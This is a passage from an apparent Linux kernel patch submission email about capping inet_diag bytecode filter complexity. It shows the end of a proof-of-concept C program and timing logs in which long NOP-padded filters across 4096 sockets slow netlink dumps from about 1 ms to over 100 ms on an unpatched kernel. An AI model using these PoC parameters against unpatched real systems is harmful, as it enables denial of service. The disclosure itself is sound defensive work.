	       opts.nops, opts.repeat,=0D
	       opts.compare ? "yes" : "no",=0D
	       opts.attack ? "yes" : "no");=0D
=0D
	if (opts.compare) {=0D
		double wall_ms;=0D
=0D
		if (run_dump(opts.listen_mode, false, 0, &wall_ms) < 0) {=0D
			teardown_sockets(fds, opts.groups * opts.sockets);=0D
			return 1;=0D
		}=0D
		printf("baseline wall_ms=3D%.3f\n", wall_ms);=0D
	}=0D
=0D
	if (opts.attack) {=0D
		for (i =3D 0; i < opts.repeat; i++) {=0D
			double wall_ms;=0D
=0D
			if (run_dump(opts.listen_mode, true, opts.nops, &wall_ms) < 0) {=0D
				teardown_sockets(fds, opts.groups * opts.sockets);=0D
				return 1;=0D
			}=0D
			printf("attack_run=3D%u wall_ms=3D%.3f\n", i + 1, wall_ms);=0D
		}=0D
	}=0D
=0D
	teardown_sockets(fds, opts.groups * opts.sockets);=0D
	return 0;=0D
}=0D
------END poc.c--------=0D
=0D
----BEGIN timing log----=0D
=3D=3D=3D=3D unfixed 7.3.0-rc1-00293-g38b6be101006, KVM/host, guest root =
=3D=3D=3D=3D=0D
kernel.watchdog_thresh =3D 10=0D
kernel.softlockup_panic =3D 0=0D
kernel.panic =3D 0=0D
=0D
=3D=3D=3D=3D unfixed, 4096 listeners, no kprobe =3D=3D=3D=3D=0D
command: ./poc --listen --groups 1 --count 4096 --nops 16380 --compare=0D
sockets_ready=3D4096 group=3D1 port=3D10000 mode=3Dlisten=0D
setup_complete groups=3D1 sockets_per_group=3D4096 total_sockets=3D4096 bas=
e_port=3D10000 stride=3D2048 mode=3Dlisten nops=3D16380 repeat=3D1 compare=
=3Dyes attack=3Dyes=0D
baseline wall_ms=3D1.429=0D
attack_run=3D1 wall_ms=3D116.242=0D
=0D
=3D=3D=3D=3D unfixed ftrace kprobe, 8 listeners =3D=3D=3D=3D=0D
command: ./poc --listen --groups 1 --count 8 --nops 16380 --cpu 0=0D
bcsk: (inet_diag_bc_sk+0x4/0x390)=0D
 <stack trace>=0D
 =3D> inet_diag_bc_sk=0D
 =3D> tcp_diag_dump=0D
 =3D> __inet_diag_dump=0D
 =3D> netlink_dump=0D
 =3D> __netlink_dump_start=0D
 =3D> inet_diag_handler_cmd=0D
 =3D> sock_diag_rcv_msg=0D
bcsk_ret: (tcp_diag_dump+0x16d/0x8f0 <- inet_diag_bc_sk)=0D
=0D
=3D=3D=3D=3D unfixed ftrace kprobe, 4096-listener compare =3D=3D=3D=3D=0D
command: ./poc --listen --groups 1 --count 4096 --nops 16380 --cpu 0 --comp=
are=0D
bcsk count=3D8212 span_ms=3D138.589=0D
bcsk_ret count=3D8212=0D
tdump count=3D19=0D
bcsk_us min=3D0.0 p50=3D10.0 p90=3D28.0 max=3D871.0 avg=3D15.8 n=3D8212=0D
bcsk_total_ms=3D129.493=0D
poc wall: baseline wall_ms=3D7.088 attack_run=3D1 wall_ms=3D131.535=0D
=0D
=3D=3D=3D=3D patched 7.3.0-rc1-00294-g03a6504e40de, 4096 listeners, 16380 N=
OPs =3D=3D=3D=3D=0D
command: ./poc --listen --groups 1 --count 4096 --nops 16380 --compare=0D
sockets_ready=3D4096 group=3D1 port=3D10000 mode=3Dlisten=0D
setup_complete groups=3D1 sockets_per_group=3D4096 total_sockets=3D4096 bas=
e_port=3D10000 stride=3D2048 mode=3Dlisten nops=3D16380 repeat=3D1 compare=
=3Dyes attack=3Dyes=0D
baseline wall_ms=3D1.479=0D
netlink: Invalid argument=0D
=0D
=3D=3D=3D=3D patched, 4096 listeners, 63 NOPs + D_EQ =3D=3D=3D=3D=0D
command: ./poc --listen --groups 1 --count 4096 --nops 63=0D
sockets_ready=3D4096 group=3D1 port=3D10000 mode=3Dlisten=0D
setup_complete groups=3D1 sockets_per_group=3D4096 total_sockets=3D4096 bas=
e_port=3D10000 stride=3D2048 mode=3Dlisten nops=3D63 repeat=3D1 compare=3Dn=
o attack=3Dyes=0D
attack_run=3D1 wall_ms=3D0.841=0D
-----END timing log-----=0D
=0D
Best regards,=0D
Zihan Xi=0D
=0D
Zihan Xi (1):=0D
  inet_diag: cap bytecode filter complexity=0D
=0D
 net/ipv4/inet_diag.c | 10 ++++++++++=0D
 1 file changed, 10 insertions(+)=0D
=0D
-- =0D
2.43.0=0D
